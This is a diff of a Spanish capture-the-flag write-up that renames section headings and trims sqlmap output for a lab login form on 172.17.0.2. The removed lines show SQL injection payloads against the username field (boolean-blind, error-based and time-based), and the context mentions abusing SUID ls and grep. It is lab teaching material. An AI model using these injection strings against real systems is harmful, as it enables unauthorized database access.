@@ -48,7 +48,7 @@ Haciendo pruebas, nos damos cuenta de que el formulario es vulnerable a un SQLi 
 
 ![Desktop View](/20251029141530.webp){: width="972" height="589" .shadow}
 
-## explotación
+## acceso inicial (pepe)
 
 Dado que se trata de un SQLi de tipo error-based, podemos extraer la información usando `sqlmap`, al cual le vamos a pasar por parámetro una petición de login que capturamos con `Burp Suite` (la debemos guardar en nuestro equipo con la opción `Copy to file`):
 
@@ -64,33 +64,8 @@ Teniendo la petición guardada, se la pasamos a `sqlmap`, y lo ejecutamos con la
  ___ ___["]_____ ___ ___  {1.9.10#stable}                                                                                                                                                                         
 |_ -| . [.]     | .'| . |                                                                                                                                                                                         
 |___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                         
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 13:30:08 /2025-10-29/
-
-[13:30:08] [INFO] parsing HTTP request from 'request.txt'
-[13:30:08] [INFO] testing connection to the target URL
-got a 302 redirect to 'http://172.17.0.2/logerror.html'. Do you want to follow? [Y/n] Y
-redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
-...
-sqlmap identified the following injection point(s) with a total of 578 HTTP(s) requests:
----
-Parameter: username (POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-    Payload: username=admin' AND 4709=(SELECT (CASE WHEN (4709=4709) THEN 4709 ELSE (SELECT 9395 UNION SELECT 6674) END))-- -&password=admin
-
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: username=admin' AND (SELECT 1007 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(1007=1007,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aOQa&password=admin
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=admin' AND (SELECT 8197 FROM (SELECT(SLEEP(5)))RBEo)-- BCYL&password=admin
----
-...
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                        
+                              
 Database: users
 Table: usuarios
 [3 entries]
@@ -115,7 +90,7 @@ pepe@bbea568b3d7c:~$ hostname -I
 172.17.0.2
 ```
 
-## escalada de privilegios
+## escalada de privilegios (root)
 
 Al ir a revisar los binarios que tengan permisos SUID, encontramos dos que nos pueden ser muy útiles: `ls` y `grep`:
 
